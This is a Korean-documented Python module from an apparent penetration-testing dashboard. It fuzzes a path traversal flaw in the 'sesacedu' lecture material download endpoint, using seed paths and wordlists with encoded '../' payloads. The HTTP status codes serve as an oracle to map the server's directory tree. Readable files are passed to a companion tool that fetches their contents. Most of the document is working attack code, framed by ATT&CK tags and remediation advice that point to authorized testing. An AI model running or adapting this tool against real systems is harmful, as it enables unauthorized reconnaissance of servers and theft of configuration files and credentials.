"""자료 경로 조작 퍼징 — 응답 코드로 서버 디렉터리 구조를 그린다.

`sesacedu_material_traversal` 은 **읽을 경로를 아는** 상태에서 그 파일을 가져온다.
이 모듈은 반대다 — **경로를 모르는** 상태에서 씨앗과 사전으로 찾아낸다.

## 응답 코드를 오라클로 쓴다

이 취약점은 디렉터리 목록을 주지 않는다. 그래서 코드 자체로 구조를 역산한다.

    200  파일이고 읽혔다
    500  있는데 파일로 못 보냄 — 디렉터리이거나 읽기 권한이 없다
    404  **stat 실패** — 없거나, 상위 경로에 탐색 권한이 없다

근거는 `LectureFileStorage.resolve()` 다. `exists()` 가 거짓이면 404 를 던지고,
참이면 `FileSystemResource` 전송에서 디렉터리·권한 문제로 예외가 나 500 이 된다.

## 단정하지 않는 두 가지 (2026-11-04 실측)

**404 는 '없음'이 아니다.** 리눅스에서 `/a/b` 를 stat 하려면 `/a` 에 실행(탐색)
권한이 필요하고, 없으면 EACCES 로 실패해 404 가 된다. 실서버에서 `/root` 는 500 인데
`/root/.bashrc` 는 404 였다 — 그 파일은 분명히 존재한다. 그래서 404 를 '없다'고
적지 않는다.

**500 은 두 가지를 겸하고 가릴 수 없다.** `<경로>/..` 를 한 번 더 때리면 디렉터리는
상위로 해석돼 500 이 오고 일반 파일은 ENOTDIR 로 404 가 온다. 그런데 **탐색 권한이
없는 디렉터리도 EACCES 로 404** 를 준다. `/etc/shadow/..` 와 `/root/..` 가 같은 404 다.
그래서 가리지 못한 500 은 '못 들어감'으로만 적고 '파일'이라고 쓰지 않는다.

## 왜 무차별이 아니라 씨앗부터인가

최상위에 사전 4,600개를 때리면 거의 전부 404 다. 반대로 'nginx 를 데비안 패키지로
깔면 /etc/nginx/sites-available 이 생긴다'는 **확정 사실**이다. 실측에서 찾은 94개 중
씨앗이 55개, 사전이 33개였다 — 씨앗이 사전보다 적중률이 높다.

사전 모드는 그 씨앗으로 **확정된 디렉터리 아래**에서만 쓴다. 범용 웹 사전보다
`fs-dirnames.txt` 가 잘 맞는다 — `webapps` 아래를 뚫은 이름은 `ROOT`·`ROOT.war` 였고,
범용 사전에는 없는 이름이다.

## 한 번에 끝나는 파이프라인

씨앗으로 디렉터리를 확정하고, **그 확정된 디렉터리 아래를 사전으로 넓히고**, 500 의 종류를
가리고, 트리를 그린다 — 여기까지가 한 실행이다. 사람이 중간에서 결과를 읽고 다음 입력을
타이핑하지 않는다. 2단계의 기준 디렉터리는 1단계가 **찾아낸 것**을 그대로 쓴다.

## 모듈이 찾은 것과 밖에서 온 것은 섞지 않는다

이 모듈이 세우는 것은 **자기 페이로드로 기계적으로 확인한 것**뿐이다. 그 밖에
사람이나 AI 가 읽힌 설정 파일 내용에서 절대경로를 읽어 넣어 확인한 것, 칼리 fsmap 으로
가져온 것은 **다른 출처**다. 같은 트리에 들어가더라도 출처를 함께 적고 집계도 따로 낸다.

    씨앗     이 모듈 — 패키지 기본 경로 사전
    확장     이 모듈 — 1단계가 확정한 디렉터리 아래
    단서     밖에서 옴 — 읽힌 파일 내용에서 사람·AI 가 찾아 넣은 경로

보고서에 "퍼징으로 찾았다"고 쓸 수 있는 것은 앞의 둘뿐이다. 단서로 찾은 것은
**무엇을 읽고 알아냈는지**까지 함께 적어야 재현된다.

## 한계 — 이름을 맞혀야만 찾는다

버전 문자열이 든 이름(`jdk-11.0.24+8`)이나 난수 접두사가 붙은 저장 파일명은
어떤 사전에도 없다. 실측에서 그런 경로는 **설정 파일 내용이 알려 줬다**
(systemd 유닛의 `JAVA_HOME`·`EnvironmentFile`). 읽힌 파일에서 절대경로를 눈으로
찾아 다시 넣는 것이 지금은 사람 몫이다. `note` 에 그 안내를 넣어 둔다.

칼리에서 더 깊이 돌리려면 `08_모의해킹/file_inclution/fsmap/` 의 도구를 쓰고,
결과는 '칼리 fsmap 결과 가져오기' 모듈로 가져온다.
"""
from dashboard.core import Finding, ToolResult, fetch
from dashboard.payloads import ENCODINGS, traversal
from dashboard import wordlists
from projects.sesacedu.modules.material_fs_map import _size, _tree

META = {
    "id": "sesacedu_material_traversal_fuzz",
    "name": "자료 경로 조작 퍼징 (구조 그리기)",
    "category": "경로 조작",
    # 로그인한 사용자가 저장소 밖 파일·디렉터리 구조를 알아낸다
    "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "kind": "active",
    "roles": ["user_web", "practice"],
    "stage": "tool",
    "severity": "high",
    "attack": [
        {"tactic": "TA0007", "technique": "T1083", "name": "File and Directory Discovery"},
        {"tactic": "TA0043", "technique": "T1595.003", "name": "Active Scanning: Wordlist Scanning"},
    ],
    "description": "씨앗(패키지 기본 경로)이나 사전으로 경로를 때려 응답 코드로 "
                   "디렉터리 구조를 그립니다. 파일 내용은 가져오지 않습니다.",
    "needs": [
        {"kind": "auth_header", "name": "Authorization",
         "why": "강의 자료는 로그인한 사용자만 내려받을 수 있어, 토큰이 없으면 전부 401 로 "
                "돌아옵니다 — 그러면 '아무것도 없다'는 거짓 지도가 나옵니다",
         "how": "대상 탭에서 그 대상의 '인증 헤더' 에 Authorization: Bearer <토큰> 을 "
                "한 줄 넣습니다. 테스트 계정 토큰만 쓰세요"},
        {"kind": "env", "name": "DASH_WORDLISTS", "required": False,
         "why": "저장소 씨앗 사전만으로는 이름 후보가 좁습니다. SecLists 를 붙이면 "
                "raft-small-directories 처럼 디렉터리 이름만 모은 목록을 고를 수 있습니다",
         "how": "SecLists 를 받아 대시보드를 띄우기 전에 DASH_WORDLISTS 에 그 폴더를 "
                "넣습니다 (wordlists/README.md). 칼리에는 /usr/share/seclists 에 이미 있습니다"},
    ],
    "params": [
        {"name": "mode", "label": "어디까지 할지", "type": "select", "default": "pipeline",
         "options": [
             {"value": "pipeline", "label": "전부 — 씨앗 → 찾은 디렉터리 아래 확장 → 종류 가리기 → 트리"},
             {"value": "seed", "label": "씨앗만 — 1단계에서 멈춘다"},
             {"value": "expand", "label": "확장만 — 기준 디렉터리를 내가 적는다"},
         ],
         "help": "기본은 한 번에 끝납니다. 2단계 기준 디렉터리는 1단계가 찾아낸 것을 그대로 씁니다 "
                 "— 결과를 읽고 다시 타이핑하지 않습니다."},
        {"name": "wordlist", "label": "씨앗 사전 (1단계)", "type": "wordlist", "purpose": "path",
         "default": "fs-seeds-sesacedu.txt",
         "help": "패키지를 깔면 생기는 **전체 경로** 목록입니다."},
        {"name": "names", "label": "이름 사전 (2단계)", "type": "wordlist", "purpose": "path",
         "default": "fs-dirnames.txt",
         "help": "1단계가 찾은 디렉터리 아래에 붙일 **이름** 목록입니다. SecLists 를 붙이면 함께 뜹니다."},
        {"name": "base", "label": "기준 디렉터리 (확장만 모드)", "default": "srv/sesacedu",
         "help": "'확장만' 에서 이 아래를 때립니다. 맨 앞 / 는 빼고 씁니다. 다른 모드에서는 무시합니다."},
        {"name": "hints", "label": "단서로 받은 경로 (한 줄에 하나)", "type": "textarea", "default": "",
         "placeholder": "opt/java/jdk-11.0.24+8\nsrv/sesacedu/config/api.env",
         "help": "읽힌 설정 파일 내용에서 사람·AI 가 찾아낸 절대경로입니다. 사전으로는 못 찾는 "
                 "이름(버전·난수)이 여기 들어옵니다. **출처를 '단서' 로 따로 적어** "
                 "퍼징이 스스로 찾은 것과 섞이지 않게 합니다."},
        {"name": "limit", "label": "몇 개까지", "type": "int", "default": "120",
         "help": "사전 앞에서부터 이만큼만 봅니다. 하나에 요청 한 번입니다."},
        {"name": "kinds", "label": "500 의 종류를 가릴지", "type": "select", "default": "yes",
         "options": [
             {"value": "yes", "label": "가린다 — '<경로>/..' 를 더 때린다 (요청 늘어남)"},
             {"value": "no", "label": "안 가린다 — 요청 절약"},
         ],
         "help": "가려도 '못 읽는 파일'과 '탐색 권한 없는 디렉터리'는 구분되지 않습니다."},
        {"name": "depth", "label": "올라갈 단계", "type": "int", "default": "9",
         "help": "저장 폴더에서 위로 몇 번. 실측 최소값은 6 이고 넉넉히 줘도 최상위에서 멈춥니다."},
        {"name": "scheme", "label": "인코딩", "type": "select", "default": "double-full",
         "options": [{"value": k, "label": v} for k, v in ENCODINGS.items()]},
        {"name": "lecture", "label": "강의 번호", "default": "123"},
    ],
}

PATH = "/backend/lectures/{lecture}/material/download?file={payload}"
MAX_REQUESTS = 400          # 한 번에 보낼 수 있는 상한
SEED_SHARE = 0.45           # 파이프라인에서 1단계가 쓸 예산 비율. 나머지는 확장·종류 가리기
DIR = "dir"
OPAQUE = "opaque"

# 어디서 온 경로인가. 모듈이 스스로 찾은 것과 밖에서 들어온 것을 섞지 않는다.
SEED, EXPAND, HINT = "seed", "expand", "hint"
SOURCE_LABEL = {SEED: "씨앗", EXPAND: "확장", HINT: "단서(밖에서)"}
MINE = (SEED, EXPAND)       # 이 모듈이 자기 페이로드로 찾은 것

# 응답 코드 → 뜻. 404 를 '없음'이라고 쓰지 않는 것이 요점이다.
READABLE, EXISTS, UNSTAT, DENIED, AUTH = "readable", "exists", "unstat", "denied", "auth"
BY_STATUS = {200: READABLE, 401: AUTH, 403: DENIED, 404: UNSTAT, 500: EXISTS}
LABEL = {
    READABLE: "읽힘",
    EXISTS: "있음(파일로 못 보냄)",
    UNSTAT: "없음 또는 접근 불가",
    DENIED: "탈출 검사 차단",
    AUTH: "토큰 필요",
}


def _send(target, lecture, depth, scheme, path):
    """경로 하나를 때린다. 파일 내용은 기록하지 않는다(구조만 본다)."""
    payload = traversal(path, depth, scheme)
    url = target.url + PATH.format(lecture=lecture, payload=payload)
    r = fetch(url, record_body=False)
    klass = BY_STATUS.get(r.status, "other")
    return klass, r


def _uniq(paths):
    """순서를 지키며 중복 제거. 좋은 사전은 빈도순이라 자를 때 순서가 중요하다."""
    seen, out = set(), []
    for p in paths:
        p = (p or "").strip().strip("/")
        if p and p not in seen:
            seen.add(p)
            out.append(p)
    return out


def _names_under(base, words):
    """기준 디렉터리 아래에 이름을 붙인다. 경로 조각으로 못 쓸 줄은 센다."""
    out, bad = [], 0
    for w in words:
        w = (w or "").strip().strip("/")
        if not w or "/" in w or ".." in w:
            bad += 1
            continue
        out.append(base + "/" + w)
    return out, bad


class _Walker:
    """경로를 때리고 결과를 모은다. 예산을 넘지 않게 스스로 센다."""

    def __init__(self, target, lecture, depth, scheme, budget):
        self.t, self.lecture, self.depth, self.scheme = target, lecture, depth, scheme
        self.left = budget
        self.sent = 0
        self.auth_stop = False
        self.nodes = []
        self.seen = set()

    def hit(self, paths, source):
        """경로 묶음을 때려 200·500 만 남긴다. 401 이면 즉시 멈춘다."""
        found = []
        for path in paths:
            if self.auth_stop or self.left <= 0:
                break
            if path in self.seen:
                continue
            self.seen.add(path)
            self.left -= 1
            self.sent += 1
            klass, r = _send(self.t, self.lecture, self.depth, self.scheme, path)
            if klass == AUTH:
                self.auth_stop = True
                break
            if klass not in (READABLE, EXISTS):
                continue
            node = {"path": "/" + path, "class": klass, "status": r.status,
                    "size": len(r.body or ""), "kind": None, "is_dir": None,
                    "note": "", "severity": "info", "source": source, "_r": r}
            self.nodes.append(node)
            found.append(node)
        return found

    def sort_kinds(self, nodes):
        """500 의 종류 가리기 — 디렉터리면 '<경로>/..' 가 상위로 해석돼 또 500 이 온다."""
        for n in nodes:
            if n["class"] != EXISTS or self.auth_stop or self.left <= 0:
                continue
            self.left -= 1
            self.sent += 1
            klass, _ = _send(self.t, self.lecture, self.depth, self.scheme,
                             n["path"].strip("/") + "/..")
            if klass == AUTH:
                self.auth_stop = True
                return
            n["kind"] = DIR if klass == EXISTS else (OPAQUE if klass == UNSTAT else None)
            n["is_dir"] = True if n["kind"] == DIR else None


def _provenance(mine, outside):
    """트리 아래에 출처를 적는다. 그림만 보면 어느 것이 퍼징의 성과인지 알 수 없다."""
    out = ["", "   출처  퍼징이 스스로 찾음 %d개(씨앗·확장)" % len(mine)]
    if outside:
        out.append("         밖에서 받아 확인만 함 %d개 — 퍼징이 찾은 것이 아니다:" % len(outside))
        out += ["           %s" % n["path"] for n in sorted(outside, key=lambda x: x["path"])]
    return "\n".join(out) + "\n"


def run(target, params):
    mode = params.get("mode", "pipeline")
    scheme = params.get("scheme", "double-full")
    lecture = params.get("lecture", "123")
    depth = int(params.get("depth") or 9)
    limit = max(1, int(params.get("limit") or 120))
    want_kinds = params.get("kinds", "yes") == "yes"
    base = (params.get("base") or "").strip().strip("/")

    # 단서 — 읽힌 파일 내용에서 사람·AI 가 찾아 넣은 경로. 모듈이 스스로 찾은 것이 아니다.
    hints = _uniq((params.get("hints") or "").splitlines())

    seeds, cut = wordlists.load(params.get("wordlist", ""), limit=limit)
    names, cut_names = [], False
    if mode in ("pipeline", "expand"):
        names, cut_names = wordlists.load(params.get("names", ""), limit=limit)
    if not seeds and mode != "expand" and not hints:
        raise ValueError("씨앗 사전이 비어 있습니다. 다른 사전을 골라 주세요")
    if mode == "expand" and not base:
        raise ValueError("'확장만' 모드에서는 기준 디렉터리를 적어 주세요 (예: srv/sesacedu)")

    walker = _Walker(target, lecture, depth, scheme, MAX_REQUESTS)
    bad = 0
    stages = []          # [(이름, 때린 경로 수)] — 어느 단계가 얼마나 썼는지 보여 준다

    # ── 단서 먼저. 사람이 일부러 넣은 것이라 예산을 못 받는 일이 없게 한다 ──
    if hints:
        walker.hit(hints, HINT)
        stages.append(("단서", len(hints)))

    if mode == "expand":
        paths, bad = _names_under(base, names or seeds)
        walker.hit(_uniq(paths), EXPAND)
        stages.append(("확장", len(paths)))
    else:
        # ── 1단계: 씨앗 ──
        share = int(MAX_REQUESTS * SEED_SHARE) if mode == "pipeline" else MAX_REQUESTS
        picked = _uniq(seeds)[:share]
        walker.hit(picked, SEED)
        stages.append(("씨앗", len(picked)))

        if mode == "pipeline" and not walker.auth_stop:
            # ── 2단계: 1단계가 '찾아낸' 디렉터리 아래를 넓힌다 ──
            # 여기가 파이프라인의 핵심이다. 기준 디렉터리를 사람이 다시 타이핑하지 않는다.
            walker.sort_kinds([n for n in walker.nodes if n["source"] in MINE])
            roots = [n["path"].strip("/") for n in walker.nodes
                     if n["kind"] == DIR and n["source"] in MINE]
            if roots and names:
                per = max(1, walker.left // (2 if want_kinds else 1) // max(1, len(roots)))
                grown = 0
                for root in roots:
                    paths, b = _names_under(root, names[:per])
                    bad += b
                    walker.hit(_uniq(paths), EXPAND)
                    grown += len(paths)
                    if walker.auth_stop or walker.left <= 0:
                        break
                stages.append((f"확장({len(roots)}곳)", grown))

    # ── 종류 가리기: 아직 안 가린 것만 ──
    if want_kinds and not walker.auth_stop:
        walker.sort_kinds([n for n in walker.nodes if n["kind"] is None])

    nodes = walker.nodes
    auth_stop = walker.auth_stop
    sent = walker.sent
    over = walker.left <= 0
    targets = list(walker.seen)
    cut = cut or cut_names

    readable = [n for n in nodes if n["class"] == READABLE]
    dirs = [n for n in nodes if n["kind"] == DIR]
    opaque = [n for n in nodes if n["kind"] == OPAQUE]

    # 이 모듈이 스스로 찾은 것과 밖에서 온 것을 갈라 센다.
    mine = [n for n in nodes if n["source"] in MINE]
    outside = [n for n in nodes if n["source"] not in MINE]

    rows, drills = [], []
    for n in sorted(nodes, key=lambda x: x["path"]):
        kind = {DIR: "디렉터리", OPAQUE: "못 들어감"}.get(n["kind"], "미판별")
        if n["class"] == READABLE:
            kind = "파일"
        rows.append([n["path"], n["status"],
                     _size(n["size"]) if n["class"] == READABLE else "—",
                     kind, LABEL[n["class"]], SOURCE_LABEL[n["source"]]])
        # 읽힌 파일은 '자료 다운로드 경로 조작' 도구로 넘겨 내용을 본다
        drills.append({"내용 보기": {"paths": n["path"].lstrip("/")}}
                      if n["class"] == READABLE else None)

    findings = []
    if readable or dirs:
        findings.append(Finding(
            title="경로 조작 퍼징으로 서버 구조 확인 (읽힌 파일 %d · 디렉터리 %d)"
                  % (len(readable), len(dirs)),
            severity="high",
            location=target.url + PATH.format(lecture=lecture, payload="<" + scheme + ">"),
            evidence=("인코딩 %s · 올라갈 단계 %s · 보낸 요청 %d건 · 때린 경로 %d개\n"
                      "단계: %s\n"
                      "읽힘 %d · 디렉터리 %d · 못 들어감 %d\n\n"
                      "**퍼징이 스스로 찾은 것 %d개** (씨앗·확장)\n%s\n\n"
                      "%s"
                      "해석 주의: 404 였던 경로는 '없다'고 단정하지 않는다 — 상위 경로에 "
                      "탐색 권한이 없어도 404 가 온다."
                      % (scheme, depth, sent, len(targets),
                         " → ".join("%s %d개" % s for s in stages) or "—",
                         len(readable), len(dirs), len(opaque),
                         len(mine),
                         "\n".join("  %s (%s)" % (n["path"], _size(n["size"]))
                                   for n in mine if n["class"] == READABLE) or "  읽힌 파일 없음",
                         ("**단서로 받아 확인한 것 %d개** (사람·AI 가 넣은 경로 — 퍼징이 찾은 것이 아니다)\n%s\n\n"
                          % (len(outside),
                             "\n".join("  %s [%s]" % (n["path"], LABEL[n["class"]])
                                       for n in outside)) if outside else ""))),
            recommendation=("경로를 정규화(realpath)한 뒤 저장 폴더 안인지 검사하고, URL "
                            "디코딩은 먼저 한 번만 합니다. 더 나은 방법은 파일 이름을 받지 않고 "
                            "자료 번호로만 찾는 것입니다. 구조가 드러나면 다음 공격의 표적이 "
                            "좁혀지므로, 읽힌 설정 파일에 든 자격증명은 전부 교체해야 합니다."),
            response=(readable or nodes)[0]["_r"]))

    note = ["파일 내용은 가져오지 않았습니다 — 응답 코드와 길이만 봅니다. "
            "내용을 보려면 읽힌 행의 '내용 보기' 로 넘어갑니다."]
    if outside:
        note.append("**출처가 섞여 있습니다.** 표의 '출처' 열을 보세요 — "
                    "`씨앗`·`확장` 은 이 모듈이 자기 페이로드로 찾은 것이고, "
                    "`단서(밖에서)` 는 사람·AI 가 읽은 내용에서 넣어 확인만 한 것입니다. "
                    "보고서에 '퍼징으로 찾았다'고 쓸 수 있는 것은 앞의 둘뿐이고, "
                    "단서는 **무엇을 읽고 알아냈는지**까지 적어야 재현됩니다.")
    note.append("**404 를 '없음'으로 읽지 마세요.** 404 는 stat 실패이고, 상위 경로에 탐색 "
                "권한이 없어도 옵니다 — 실서버에서 `/root` 는 500 인데 분명히 존재하는 "
                "`/root/.bashrc` 는 404 였습니다. 그래서 404 경로는 표에 올리지 않습니다.")
    note.append("**'못 들어감' 은 파일인지 디렉터리인지 가리지 못한 것입니다.** 읽기 권한이 "
                "없는 파일(ENOTDIR)과 탐색 권한이 없는 디렉터리(EACCES)가 같은 404 를 주기 "
                "때문입니다. 보고서에 '파일이다' 로 쓰면 틀립니다.")
    note.append("찾지 못한 것이 없다는 뜻은 아닙니다. 이름을 맞혀야만 찾습니다 — "
                "`jdk-11.0.24+8` 처럼 버전이 든 이름은 어떤 사전에도 없습니다. "
                "읽힌 설정 파일에서 절대경로를 찾아 다시 넣어 보세요(실측에서 systemd 유닛의 "
                "JAVA_HOME·EnvironmentFile 이 사전으로 못 찾는 경로를 알려 줬습니다).")
    if cut:
        note.append("사전이 길어 앞에서부터 %d개만 읽었습니다." % limit)
    if over:
        note.append("한 번에 %d건까지 보냅니다. 경로를 %d개로 줄여 보냈습니다 — "
                    "나머지는 기준 디렉터리를 좁혀 다시 돌리세요." % (MAX_REQUESTS, len(targets)))
    if bad:
        note.append("사전에서 경로 조각으로 쓸 수 없는 %d줄을 건너뛰었습니다(슬래시·'..' 포함)." % bad)
    if auth_stop:
        note.append("**401 을 받아 중간에 멈췄습니다.** 토큰이 없거나 만료됐습니다 — "
                    "이대로 두면 전부 404·401 로 보여 '아무것도 없다'는 거짓 지도가 됩니다.")

    return ToolResult(
        summary="%s · 때린 경로 %d · 읽힘 %d · 디렉터리 %d · 못 들어감 %d · 요청 %d건%s"
                % (" → ".join("%s %d" % s for s in stages) or "—",
                   len(targets), len(readable), len(dirs), len(opaque), sent,
                   (" (그중 단서 %d)" % len(outside)) if outside else ""),
        columns=["경로", "응답", "크기", "종류", "결과", "출처"],
        rows=rows, drills=drills,
        text=(_tree(nodes) + _provenance(mine, outside)) if nodes else "",
        findings=findings,
        note=" ".join(note))
